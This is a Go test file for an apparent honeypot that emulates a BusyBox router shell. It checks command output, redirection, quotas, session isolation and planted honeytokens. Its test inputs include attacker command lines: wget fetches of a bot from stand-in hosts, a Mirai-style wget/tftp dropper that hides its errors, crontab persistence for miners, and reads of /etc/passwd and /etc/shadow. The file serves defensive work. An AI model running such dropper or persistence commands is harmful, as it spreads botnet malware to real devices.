package vfs

import (
	"fmt"
	"path"
	"runtime"
	"strings"
	"testing"
	"time"
)

// Each row = a line sent by the attacker + what must appear on screen.
func TestRun(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"whoami", "root\n"},
		{"uname -m", "armv7l\n"},
		{"cd /tmp; pwd", "/tmp\n"},
		{"cd /tmp/../etc && pwd", "/etc\n"},
		{"cd /missing || cd /var/run; pwd", "-sh: cd: can't cd to /missing: No such file or directory\n/var/run\n"},
		{"cd /missing 2>/dev/null || cd /var/run; pwd", "/var/run\n"},
		{"cat /etc/passwd | grep admin", "admin:x:0:0:admin:/root:/bin/ash\n"}, // admin has uid 0 (still root)
		{"cat /proc/cpuinfo | grep 'model name'", "model name\t: ARMv7 Processor rev 5 (v7l)\n"},
		{`echo -e '\x6b\x61\x6d\x69'`, "kami\n"},
		{`echo "a; b" && echo c`, "a; b\nc\n"},
		{"echo -n done", "done"},
		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
		{"busybox echo hello", "hello\n"},
		{"wget http://evil.example/bot && echo never-printed", "wget: can't connect to remote host: Connection timed out\n"},
		{"ls /var", "log    run    spool  tmp    www\n"},
		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
		{"echo hi > /missing/file", "-sh: can't create /missing/file: nonexistent directory\n"},
		{"cd /tmp; wget http://x/bot -O - > bot; cat bot; ls", "wget: can't connect to remote host: Connection timed out\nbot\n"},
		{"cat /missing > f 2>/dev/null; ls", "f\n"},
		{"cat /tmp", "cat: read error: Is a directory\n"},
		{"./bot", "-sh: ./bot: not found\n"},
		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "started\n"},
		{"ls /etc", "dropbear      hostname      lighttpd      ppp           shadow\n" + // columns as wide as
			"group         hosts         os-release    profile       shells\n" + // the longest name + 2
			"hostapd.conf  issue.net     passwd        resolv.conf\n"},
		{"ps | grep lighttpd", "  349 root      2108 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf\n"}, // port 80 = a running web server
		{"cat /var/run/lighttpd.pid", "349\n"}, // its PID, in the pid-file from its config
		{"ls /var/www", "index.html  login.cgi\n"},
		{"grep document-root /etc/lighttpd/lighttpd.conf", "server.document-root = \"/var/www\"\n"},
		{"cat /var/www/index.html | grep action", "    <form method=\"POST\" action=\"/login.cgi\">\n"},
		{"curl -O http://x/a.sh", "-sh: curl: not found\n"}, // BusyBox has no curl
		{"enable", "-sh: enable: not found\n"},              // Mirai's probe for a vendor CLI
		{"cat /etc/shells", "/bin/ash\n"},
		{"grep wheel /etc/group", "wheel:x:10:root\n"},
		{"uname -a", "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n"},
		{"cat /proc/version", "Linux version 4.14.180 (builder@buildhost) (gcc version 8.3.0 (Buildroot 2019.05.3)) #1 SMP Thu Jun  4 12:00:00 UTC 2020\n"},
		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
		{"cat /bin/echo", elfHeader}, // a link to busybox: Mirai reads the ELF header through it
		{"/usr/bin/wget http://x/bot", "wget: can't connect to remote host: Connection timed out\n"},
		{"cd /bin; ./ls /var", "log    run    spool  tmp    www\n"},
		{"/sbin/init", "init: must be run as PID 1\n"},
		{"cat /var/run/dropbear.pid", "341\n"},
		{"cat /proc/meminfo | grep MemTotal", "MemTotal:         124520 kB\n"},
		{"", ""},
		{";;", ""},
	}

	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// Redirections like ash (BusyBox 1.30.1, with Buildroot's ASH_BASH_COMPAT): glued to words or not,
// applied in order, errors apart from the output (they skip a | and go where 2 points).
func TestRedirects(t *testing.T) {
	const noFile = "cat: can't open '/nofile': No such file or directory\n"
	tests := []struct {
		line string
		want string
		code int
	}{
		{"cd /tmp; echo hi>x; cat x", "hi\n", 0}, // ">" ends a word
		{"uname -m>/tmp/u; cat /tmp/u", "armv7l\n", 0},
		{"cd /tmp; echo a2>x; cat x", "a2\n", 0},     // "a2" is a word, not a descriptor
		{"cd /tmp; echo 2>x; cat x", "\n", 0},        // "2>": errors to x, echo prints an empty line
		{`cd /tmp; echo "2">x; cat x`, "2\n", 0},     // a quoted 2 is a word
		{`echo ">" '2>x' "a&>b"`, "> 2>x a&>b\n", 0}, // operators in quotes are text
		{"cd /tmp; echo hi>x&&cat x", "hi\n", 0},     // glued to && too
		{"cd /tmp; echo hi 1>x; cat x", "hi\n", 0},
		{"cd /tmp; echo hi >>x; echo ho >>x; cat x", "hi\nho\n", 0},
		{"cd /tmp; echo one >x >y; cat x; cat y", "one\n", 0}, // both created, the last one wins
		{"cd /tmp; >empty; ls", "empty\n", 0},                 // a redirection alone creates the file

		// where the errors go: the order matters, like in any shell
		{"cat /nofile >/dev/null 2>&1", "", 1}, // what bots append to every command
		{"cat /nofile 2>&1 >/dev/null", noFile, 1},
		{"cd /tmp; cat /nofile >f 2>&1; cat f", noFile, 0},
		{"cd /tmp; cat /nofile 2>err; cat err", noFile, 0},
		{"cat /nofile &>/dev/null", "", 1}, // bash's "&>" (ash has it with ASH_BASH_COMPAT)
		{"cat /nofile >&/dev/null", "", 1}, // ">&file" = "&>file"
		{"cat /nofile 2>&/dev/null", "-sh: redir error\n", 1},
		{"nosuchcmd 2>/dev/null", "", 127},
		{"echo hi > /missing/x 2>/dev/null", "-sh: can't create /missing/x: nonexistent directory\n", 1},
		{"echo hi 2>/dev/null > /missing/x", "", 1}, // 2 already pointed to /dev/null
		{"echo hi >&5", "-sh: 5: Bad file descriptor\n", 1},
		{"echo hi >&-", "sh: write error: Bad file descriptor\n", 1},

		// errors skip a pipe, unless 2>&1 sends them into it
		{"cat /nofile | grep x", noFile, 1},
		{"cat /nofile 2>&1 | grep can", noFile, 0},
		{"echo hi >&2 | grep x", "hi\n", 1},

		// input
		{"cat < /etc/hostname", "gateway\n", 0},
		{"grep daemon </etc/passwd", "daemon:*:1:1:daemon:/var:/bin/false\n", 0},
		{"cat < /nofile", "-sh: can't open /nofile: no such file\n", 1},
		{"cat 2>/dev/null </nofile", "", 1}, // ash's own message goes where 2 points by then

		// a redirection without its file: nothing on the line runs
		{"echo hi >", "-sh: syntax error: unexpected newline\n", 2},
		{"echo a; echo b >; echo c", "-sh: syntax error: unexpected \";\"\n", 2},
		{"echo a > > b", "-sh: syntax error: unexpected redirection\n", 2},
		{"echo a > | grep a", "-sh: syntax error: unexpected \"|\"\n", 2},
		{"cd /tmp; echo a >|f; cat f", "a\n", 0}, // ">|" (no space) is ash's "clobber": a plain ">" here

		// a Mirai-style dropper line: every error hidden
		{"cd /tmp || cd /var/run; wget http://203.0.113.5/x.sh -O- >/dev/null 2>&1; " +
			"busybox tftp -g -r x.sh 203.0.113.5 >/dev/null 2>&1; chmod 777 x.sh; sh x.sh >/dev/null 2>&1", "", 0},
	}
	for _, tt := range tests {
		if got, code, _ := NewShell().Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
}

// Whatever an attacker types, nothing may panic (a panic in one session stops the whole agent) and
// no session gets past its quota. `go test` runs only these seeds; new lines are made up with
// `go test -fuzz=FuzzRun -fuzztime=2m ./internal/vfs/` (a crash is saved in testdata/fuzz/FuzzRun).
func FuzzRun(f *testing.F) {
	for _, seed := range []string{
		"echo hi>x; cat x", "cat /nofile >/dev/null 2>&1", "echo b >; echo c", "> > >", "2>&1 2>&- <&0 <<x",
		"(echo a; echo b) | grep a", `echo "a'b" 'c"d' "2">x`, "cat < /etc/passwd | grep root &>f &", "(((", ")))",
		"a&>b&&c||d|e;f\ng", "echo x >&99999999 >&-", "cd /tmp; mkdir a; cd a; touch b; cp b ../c; rm b",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, line string) {
		sh := NewShell()
		sh.Run(line)
		sh.Run(line) // again, over what the first run created
		if used := sh.quotaUsed(); used > sessionQuota {
			t.Errorf("Run(%q): %d bytes used, quota %d", line, used, sessionQuota)
		}
	})
}

// Run returns the exit code of the last command that ran, like $? (SSH sends it to the client).
func TestExitCodes(t *testing.T) {
	tests := []struct {
		line string
		want int
	}{
		{"whoami", 0},
		{"nosuchcmd", 127},
		{"curl http://203.0.113.7/x.sh", 127},
		{"cat /missing", 1},
		{"wget http://203.0.113.7/x", 1},
		{"false && echo never", 1}, // echo is skipped, so $? stays 1
		{"nosuchcmd || true", 0},
		{"lighttpd", 0}, // a program in PATH that isn't an applet: "runs" silently
		{"/usr/sbin/dropbear", 0},
		{"cat /etc/hostname | grep nomatch", 1}, // a pipe's code is its last command's
		{"free -h", 1},                          // BusyBox's free has no -h: usage
		{"nproc && free -m && df -h && uptime", 0},
		{"df /nope", 1},
		{"crontab -l", 1}, // no crontab yet
		{"echo '* * * * * x' | crontab - && crontab -l", 0},
		{"", 0},
	}
	for _, tt := range tests {
		if _, code, _ := NewShell().Run(tt.line); code != tt.want {
			t.Errorf("Run(%q): exit code %d, want %d", tt.line, code, tt.want)
		}
	}
}

// exit ends the session: nothing after it runs.
func TestExit(t *testing.T) {
	out, _, exit := NewShell().Run("echo bye; exit; echo never-printed")
	if out != "bye\n" || !exit {
		t.Errorf("got %q, exit=%v", out, exit)
	}
}

// The prompt follows the current directory.
func TestPrompt(t *testing.T) {
	sh := NewShell()
	if p := sh.Prompt(); p != "root@gateway:~# " {
		t.Errorf("prompt at start: %q", p)
	}
	sh.Run("cd /tmp")
	if p := sh.Prompt(); p != "root@gateway:/tmp# " {
		t.Errorf("prompt after cd /tmp: %q", p)
	}
}

// Two attackers must not see each other's files or current directory.
func TestSessionsAreSeparate(t *testing.T) {
	a := NewShell()
	b := NewShell()
	a.Run("cd /tmp; echo secret > x")

	if out, _, _ := b.Run("cat /tmp/x"); out != "cat: can't open '/tmp/x': No such file or directory\n" {
		t.Errorf("b sees a's file: %q", out)
	}
	if out, _, _ := b.Run("pwd"); out != "/root\n" {
		t.Errorf("b has a's directory: %q", out)
	}
}

// fixedClock makes the ls -l dates predictable: "now" is Nov 20 2026 10:30, the boot was 2 days before.
func fixedClock(t *testing.T) {
	oldNow, oldBoot := now, bootTime
	now = func() time.Time { return time.Date(2026, time.November, 20, 10, 30, 0, 0, time.UTC) }
	bootTime = time.Date(2026, time.November, 18, 9, 15, 0, 0, time.UTC)
	t.Cleanup(func() { now, bootTime = oldNow, oldBoot })
}

// ls like BusyBox 1.30: columns, hidden files, several targets and the -l line
// ("%-10s %4d %-8s %-8s %9s" + date + name, the same printf as in BusyBox's ls.c).
func TestLs(t *testing.T) {
	fixedClock(t)
	const nippon = "cd /tmp; echo kami > .nippon; mkdir d; " // a bot's hidden file + a directory
	tests := []struct{ line, want string }{
		{"ls /", "bin   dev   etc   lib   mnt   proc  root  sbin  sys   tmp   usr   var\n"},
		{"ls -1 /var", "log\nrun\nspool\ntmp\nwww\n"},
		{"ls --color=auto /var", "log    run    spool  tmp    www\n"},
		{"ls /nope /etc/hostname", "ls: /nope: No such file or directory\n/etc/hostname\n"},
		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},

		// hidden files (.x) only with -a or -A, or when named
		{nippon + "ls", "d\n"},
		{nippon + "ls -a", ".        ..       .nippon  d\n"},
		{nippon + "ls -A", ".nippon  d\n"},
		{nippon + "ls .nippon", ".nippon\n"},

		// -l: firmware files from 2020 (older than 6 months -> year), /tmp /var /dev /proc from boot,
		// the attacker's files from "now"
		{"ls -la", "drwxr-xr-x    2 root     root            40 Jun  4  2020 .\n" +
			"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n"},
		{"ls -l /var/run", "-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n" +
			"-rw-r--r--    1 root     root             4 Nov 18 09:15 lighttpd.pid\n"},
		{"ls -l /bin/sh /bin/busybox /dev/null",
			"-rwxr-xr-x    1 root     root        278412 Jun  4  2020 /bin/busybox\n" +
				"lrwxrwxrwx    1 root     root             7 Jun  4  2020 /bin/sh -> busybox\n" +
				"crw-rw-rw-    1 root     root        1,   3 Nov 18 09:15 /dev/null\n"},
		{"ls -l /usr/bin/wget /proc/cpuinfo",
			"-r--r--r--    1 root     root             0 Nov 18 09:15 /proc/cpuinfo\n" +
				"lrwxrwxrwx    1 root     root            17 Jun  4  2020 /usr/bin/wget -> ../../bin/busybox\n"},
		{"ls -ld /tmp /proc",
			"dr-xr-xr-x    2 root     root             0 Nov 18 09:15 /proc\n" +
				"drwxrwxrwt    2 root     root            40 Nov 18 09:15 /tmp\n"},
		{nippon + "ls -la",
			"drwxrwxrwt    3 root     root            80 Nov 18 09:15 .\n" +
				"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n" +
				"-rw-r--r--    1 root     root             5 Nov 20 10:30 .nippon\n" +
				"drwxr-xr-x    2 root     root            40 Nov 20 10:30 d\n"},
		{"ls -l /var/www/login.cgi", // a program; /var/www is on the firmware, not in RAM like /var/run
			"-rwxr-xr-x    1 root     root         13764 Jun  4  2020 /var/www/login.cgi\n"},
		{"ls -l /etc/dropbear", // a key file in Dropbear's format, 141 bytes like a real ECDSA P-256 one
			"-rw-------    1 root     root           141 Jun  4  2020 dropbear_ecdsa_host_key\n"},
		{"echo x >> /etc/shadow; ls -l /etc/shadow", // overwriting keeps the mode, the date changes
			"-rw-------    1 root     root           290 Nov 20 10:30 /etc/shadow\n"},
	}
	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// Columns go top to bottom, then left to right, each as wide as the longest name + 2 (BusyBox).
func TestColumns(t *testing.T) {
	names := []string{"ash", "busybox", "cat", "chmod", "cp", "echo", "false", "grep", "hostname", "kill",
		"login", "ls", "mkdir", "mv", "ps", "pwd", "rm", "sh", "sleep", "touch", "true", "uname"}
	want := "ash       cp        hostname  mkdir     rm        true\n" +
		"busybox   echo      kill      mv        sh        uname\n" +
		"cat       false     login     ps        sleep\n" +
		"chmod     grep      ls        pwd       touch\n"
	if got := columns(names); got != want {
		t.Errorf("columns:\n%s\nwant:\n%s", got, want)
	}

	long := strings.Repeat("x", 80) // wider than the terminal -> one name per line
	if got := columns([]string{long, "y"}); got != long+"\ny\n" {
		t.Errorf("a name wider than the terminal: %q", got)
	}
}

// Every applet link must work as a command: an "ls /bin" entry that answers "not found" gives us away.
func TestAppletsAreImplemented(t *testing.T) {
	for p, target := range fakeLinks {
		if path.Base(target) != "busybox" {
			continue // the C library links
		}
		if out, code, _ := NewShell().command([]string{p}, ""); code == 127 {
			t.Errorf("%s -> %s is listed but not implemented: %q", p, target, out)
		}
	}
}

// Every path ps shows (programs, the pid file, /bin/login) must exist: an attacker can ls -l it.
func TestPsMatchesFiles(t *testing.T) {
	sh := NewShell()
	for _, line := range strings.Split(fakePS, "\n") {
		fields := strings.Fields(line)
		for _, f := range fields[min(4, len(fields)):] { // the COMMAND column and its arguments
			if _, ok := sh.readFile(f); strings.HasPrefix(f, "/") && !ok {
				t.Errorf("ps shows %s, which does not exist", f)
			}
		}
	}
}

// "busybox" alone: BusyBox 1.30.1's own text, then the applets wrapped like appletlib.c does
// (a new line when col >= 79 - (len + 2); the tab counts as 6).
func TestBusyboxHelp(t *testing.T) {
	out, _, _ := NewShell().Run("busybox")
	if !strings.HasPrefix(out, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n") {
		t.Errorf("first line: %q", strings.SplitN(out, "\n", 2)[0])
	}
	want := "Currently defined functions:\n" +
		"\tash, cat, chmod, cp, crontab, df, echo, false, free, ftpget, grep,\n" +
		"\thostname, id, init, kill, killall, klogd, login, ls, mkdir, mv, nproc,\n" +
		"\tps, pwd, rm, sh, sleep, syslogd, telnetd, tftp, touch, true, uname,\n" +
		"\tuptime, wget, whoami\n"
	if !strings.HasSuffix(out, want) {
		t.Errorf("applet list:\n%s\nwant:\n%s", out[strings.Index(out, "Currently"):], want)
	}
}

// The web server's files come from /var/www; ".." can't leave it (lighttpd cleans the path too).
func TestWebFile(t *testing.T) {
	tests := []struct {
		path   string
		exists bool
	}{
		{"/", true}, // index-file.names: index.html
		{"/index.html", true},
		{"/login.cgi", true},
		{"/login", false},
		{"/../../etc/passwd", false}, // = /var/www/etc/passwd, not /etc/passwd
		{"/etc/passwd", false},
		{"/var/www/index.html", false}, // a URL path, not a filesystem path
	}
	for _, tt := range tests {
		if _, ok := WebFile(tt.path); ok != tt.exists {
			t.Errorf("WebFile(%q): exists = %v, want %v", tt.path, ok, tt.exists)
		}
	}
	if page, _ := WebFile("/"); page != LoginPage(false) {
		t.Error("/ is not the login page")
	}
}

// What cryptominers check before installing: the output of BusyBox 1.30.1 (its printf formats) with
// Buildroot's config, the numbers from /proc/meminfo, /proc/cpuinfo and /proc/mounts.
func TestMinerCommands(t *testing.T) {
	fixedClock(t) // now Nov 20 10:30:00, boot Nov 18 09:15:00 = up 2 days 1:15
	const crontabUsage = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
		"Usage: crontab [-c DIR] [-u USER] [-ler]|[FILE]\n\n" +
		"\t-c\tCrontab directory\n\t-u\tUser\n\t-l\tList crontab\n\t-e\tEdit crontab\n" +
		"\t-r\tDelete crontab\n\tFILE\tReplace crontab by FILE ('-': stdin)\n"
	tests := []struct{ line, want string }{
		// free: total = MemTotal, free = MemFree, shared = Shmem, buff/cache = Buffers + Cached,
		// used = the rest, available = MemAvailable; no swap
		{"free", "              total        used        free      shared  buff/cache   available\n" +
			"Mem:         124520       58608       38412         312       27500       61208\n" +
			"Swap:             0           0           0\n"},
		{"free -m | grep Mem", "Mem:            121          57          37           0          26          59\n"},
		{"free -h", "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
			"Usage: free [-b/k/m/g]\n\nDisplay the amount of free and used system memory\n"},
		{"nproc", "1\n"}, // one "processor" in /proc/cpuinfo
		{"nproc --all", "1\n"},

		{"uptime", " 10:30:00 up 2 days,  1:15,  load average: 0.08, 0.03, 0.01\n"},
		{"uptime -s", "2026-11-18 09:15:00\n"},
		{"cat /proc/uptime /proc/loadavg", "177300.00 173754.00\n0.08 0.03 0.01 1/11 530\n"}, // 11 processes in ps

		// df: the two tmpfs from /proc/mounts (rootfs, proc and sysfs have no blocks); /tmp gets
		// half the RAM (62260K), /dev its size=512k
		{"df", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                    62260         0     62260   0% /tmp\n" +
			"tmpfs                      512         0       512   0% /dev\n"},
		{"df -h", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M         0     60.8M   0% /tmp\n" +
			"tmpfs                   512.0K         0    512.0K   0% /dev\n"},
		{"cd /tmp; echo kami > .x; df -h .", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M      4.0K     60.8M   0% /tmp\n"}, // a file takes a whole 4K page
		{"echo kami > /tmp/x; df -m | grep /tmp", "tmpfs                       61         0        61   0% /tmp\n"},
		{"cp /etc/passwd /dev/shm/p; df /dev/shm", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                      512         4       508   1% /dev\n"}, // 1 page of 128: (100 + 64) / 128
		{"df -T | grep Filesystem", "Filesystem           Type       1K-blocks      Used Available Use% Mounted on\n"},
		{"df /proc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"proc                         0         0         0   0% /proc\n"},
		{"df /etc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n"}, // on rootfs: left out
		{"df /nope", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"df: /nope: can't find mount point\n"},

		// crontab: how miners come back after a reboot
		{"crontab -l", "crontab: can't open 'root': No such file or directory\n"},
		{`(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/x") | crontab -; crontab -l`, "*/5 * * * * /tmp/x\n"},
		{"echo '* * * * * a' | crontab -; crontab -r; crontab -l", "crontab: can't open 'root': No such file or directory\n"},
		{"echo '@reboot /tmp/x' > /tmp/c; crontab /tmp/c; ls /var/spool/cron/crontabs; cat /var/spool/cron/crontabs/cron.update",
			"cron.update  root\nroot\n"},
		{"crontab /tmp/nope", "crontab: can't open '/tmp/nope': No such file or directory\n"},
		{"crontab -u admin -l", "crontab: can't open 'admin': No such file or directory\n"},
		{"crontab -u bob -l", "crontab: unknown user bob\n"},
		{"crontab -e; crontab -l && echo empty", "crontab: can't execute 'vi': No such file or directory\nempty\n"},
		{"crontab", crontabUsage},
		{"crontab -l -r", crontabUsage},

		// a subshell's commands are one group: | gets all their output; "$(" is still part of a word
		{"(echo a; echo b) | grep b", "b\n"},
		{"(echo a; echo b) | grep a", "a\n"},
		{"(echo a; echo b)", "a\nb\n"},
		{"echo x; (echo a) | grep a; echo y | grep y", "x\na\ny\n"},
		{"echo $(id)", "$(id)\n"},
		{"echo '* * * * * one' | crontab -; (crontab -l; echo '* * * * * two') | crontab -; crontab -l",
			"* * * * * one\n* * * * * two\n"}, // a bot that comes twice keeps its first job too
	}
	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// A session's files get 256KB in all (sessionQuota). Then every way of writing fails like on a full
// disk, with BusyBox's own messages, df shows it full, and rm frees space again. One shell, in order.
func TestDiskQuota(t *testing.T) {
	sh := NewShell()
	page := "echo " + strings.Repeat("a", 4095) // prints exactly one 4KB page (with the \n)
	n := 0                                      // one-page files written before the disk was full
	for ; n < 100; n++ {
		if out, code, _ := sh.Run(fmt.Sprintf("%s > /tmp/f%d", page, n)); out != "" || code != 0 {
			if out != "sh: write error: No space left on device\n" || code != 1 {
				t.Fatalf("file %d: %q, exit code %d (expected echo's write error, 1)", n, out, code)
			}
			break
		}
	}
	// each file costs its page + its name + 256 (the "inode"): f0-f9 4359, f10-f59 4360, so 60 fit
	// (554 left); f60 still gets its name and inode (264), not its page: 290 bytes left
	if left := sessionQuota - sh.quotaUsed(); n != 60 || left != 290 {
		t.Fatalf("%d one-page files fit, %d bytes left (expected 60 and 290)", n, left)
	}

	tests := []struct {
		line string
		want string
		code int
	}{
		{"cat /tmp/f60; echo end", "end\n", 0}, // the file that didn't fit exists, empty
		// df: Used = the 60 pages, nothing Available, 100% (df.c: used / (used + available))
		{"df /tmp /dev", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                    62260       240         0 100% /tmp\n" +
			"tmpfs                      512         0         0   0% /dev\n", 0},
		{"df -h /tmp", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M    240.0K         0 100% /tmp\n", 0},
		{"echo hi >> /tmp/f0", "sh: write error: No space left on device\n", 1}, // f0's page is full
		{"echo hi >> /tmp/f1 2>/dev/null", "", 1},
		{"cat /tmp/f1 | grep a", strings.Repeat("a", 4095) + "\n", 0},                  // f1 kept its page, without "hi"
		{"cat /etc/passwd > /tmp/c", "cat: write error: No space left on device\n", 1}, // name fits, page doesn't
		// 28 bytes left: not even an empty file fits now (like running out of inodes)
		{"cp /etc/passwd /tmp/p", "cp: can't create '/tmp/p': No space left on device\n", 1},
		{"touch /tmp/t", "touch: /tmp/t: No space left on device\n", 1},
		{"mkdir /tmp/d", "mkdir: can't create directory '/tmp/d': No space left on device\n", 1},
		{"echo x > /tmp/n", "-sh: can't create /tmp/n: No space left on device\n", 1},
		{"echo '* * * * * /tmp/x' | crontab -", "crontab: can't create /var/spool/cron/crontabs/root.new\n", 0},
		// rm frees space: 290 again, the crontab's name fits, its line doesn't (and BusyBox exits 0)
		{"rm /tmp/c; echo '* * * * * /tmp/x' | crontab -", "crontab: write error: No space left on device\n", 0},
		{"rm /tmp/f0 /tmp/f1; echo hi > /tmp/f0; cat /tmp/f0", "hi\n", 0},
		{"touch /tmp/q; cp /tmp/f2 /tmp/p", "cp: write error: No space left on device\n", 1}, // 3840 left for p
	}
	for _, tt := range tests {
		if got, code, _ := sh.Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
}

// Whatever a session does (the attacks found on 20.11: many copies of a big file, many empty files,
// many directories, in one long SSH command), what it keeps in RAM stays around sessionQuota.
// Measured for real (heap): a cut string can keep far more memory alive than its length says.
func TestDiskQuotaBoundsMemory(t *testing.T) {
	heap := func() int64 {
		runtime.GC()
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		return int64(m.HeapAlloc)
	}
	for _, command := range []string{"cat /tmp/b > /tmp/f%d; ", "touch /tmp/e%d; ", "mkdir /tmp/d%d; "} {
		var line strings.Builder
		for i := range 3000 {
			fmt.Fprintf(&line, command, i)
		}
		attack := func() *Shell {
			sh := NewShell()
			sh.Run("echo " + strings.Repeat("b", maxSize) + " > /tmp/b") // 16KB, the most one file can hold
			sh.Run(line.String())
			return sh
		}

		start := heap()
		shells := []*Shell{attack(), attack(), attack(), attack()}
		perShell := (heap() - start) / int64(len(shells))
		if perShell > sessionQuota*3/2 { // the files + the maps around them (measured: at most ~260KB)
			t.Errorf("%q x 3000: one session keeps %d bytes in RAM (quota %d)", command, perShell, sessionQuota)
		}

		sh := shells[0]
		bytes := 0 // names + contents
		for p, content := range sh.files {
			bytes += len(p) + len(content)
		}
		for p := range sh.dirs {
			bytes += len(p)
		}
		entries := len(sh.files) + len(sh.dirs)
		if used := sh.quotaUsed(); used > sessionQuota || bytes > sessionQuota || entries > sessionQuota/256 {
			t.Errorf("%q x 3000: used %d of %d, %d bytes in %d files and directories",
				command, used, sessionQuota, bytes, entries)
		}
		runtime.KeepAlive(shells)
	}
}

// The honeytokens are where an attacker looks for them, and the programs that use those files run.
func TestHoneytokens(t *testing.T) {
	fixedClock(t)
	tests := []struct{ line, want string }{
		{"grep wpa_passphrase /etc/hostapd.conf", "wpa_passphrase=w7Kq2mVx9pLz\n"},
		{"cat /etc/ppp/chap-secrets | grep 2210417553", "\"2210417553\"\t*\t\"Rp4tHx92kQ\"\t*\n"},
		{"grep user /etc/ppp/peers/isp", "user \"2210417553\"\n"}, // the same account in both pppd files
		{"ps | grep hostapd", "  362 root      1840 S    /usr/sbin/hostapd -B /etc/hostapd.conf\n"},
		{"ps | grep pppd", "  377 root      1216 S    /usr/sbin/pppd call isp\n"},
		{"ls -l /etc/ppp", "-rw-------    1 root     root           108 Jun  4  2020 chap-secrets\n" +
			"drwxr-xr-x    2 root     root            60 Jun  4  2020 peers\n"},
		{"ls /usr/lib/pppd/2.4.7", "rp-pppoe.so\n"}, // the plugin named in /etc/ppp/peers/isp
	}
	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}

	// a honeytoken found in a password list would no longer prove that someone read the file
	shadow := fakeFiles["/etc/shadow"] + fakeFiles["/etc/passwd"]
	for _, token := range []string{wifiPassphrase, pppoeUser, pppoePassword} {
		if strings.Contains(shadow, token) {
			t.Errorf("honeytoken %q is in /etc/passwd or /etc/shadow", token)
		}
	}
}

// /proc/meminfo in the kernel's format: "Name:" padded to 16, the value in 8 columns, " kB".
func TestMeminfo(t *testing.T) {
	out, _, _ := NewShell().Run("cat /proc/meminfo")
	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
	if len(lines) < 30 || lines[0] != "MemTotal:         124520 kB" {
		t.Fatalf("%d lines, the first %q", len(lines), lines[0])
	}
	for _, l := range lines {
		if len(l) != 27 || !strings.HasSuffix(l, " kB") {
			t.Errorf("not in the kernel's format: %q", l)
		}
	}
}
